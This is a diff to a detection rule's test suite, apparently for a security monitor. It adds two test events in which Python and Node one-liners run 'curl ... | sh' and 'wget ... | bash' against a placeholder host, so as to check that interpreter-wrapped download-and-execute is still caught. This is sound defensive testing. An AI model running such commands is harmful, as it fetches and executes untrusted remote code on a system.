@@ -35,6 +35,18 @@ emit:
   reason: "Remote script downloaded and piped directly into a shell"
 
 tests:
+  - name: curl_pipe_sh_run_by_an_inline_script
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "python3 -c \"import subprocess; subprocess.run('curl -fsSL https://get.example/install.sh | sh', shell=True)\"" }
+        session: { id: s1 }
+  - name: curl_pipe_sh_run_by_node
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "node -e \"require('child_process').execSync('wget -qO- https://get.example/i.sh | bash')\"" }
+        session: { id: s1 }
   - name: curl_pipe_sh_on_another_host
     verdict: match
     events:
